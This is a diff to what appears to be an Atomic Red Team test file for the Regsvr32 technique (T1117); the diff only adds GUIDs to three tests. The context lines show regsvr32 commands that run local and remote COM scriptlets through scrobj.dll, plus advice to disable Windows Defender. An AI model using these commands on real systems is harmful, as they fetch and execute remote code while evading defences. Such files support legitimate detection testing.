@@ -3,6 +3,7 @@ attack_technique: T1117
 display_name: Regsvr32
 atomic_tests:
 - name: Regsvr32 local COM scriptlet execution
+  auto_generated_guid: 04243a5a-4d74-46d8-9a06-c80c4e639e81
   description: |
     Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.
   supported_platforms:
@@ -30,6 +31,7 @@ atomic_tests:
     regsvr32.exe /s /u /i:#{filename} scrobj.dll
 
 - name: Regsvr32 remote COM scriptlet execution
+  auto_generated_guid: 98f62af6-6496-4663-b3c5-51b714db0707
   description: |
     Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
     windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
@@ -47,6 +49,7 @@ atomic_tests:
     regsvr32.exe /s /u /i:#{url} scrobj.dll
 
 - name: Regsvr32 local DLL execution
+  auto_generated_guid: 998e8df6-59b5-48ad-ae53-491d744fa978
   description: |
     Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.
   supported_platforms:
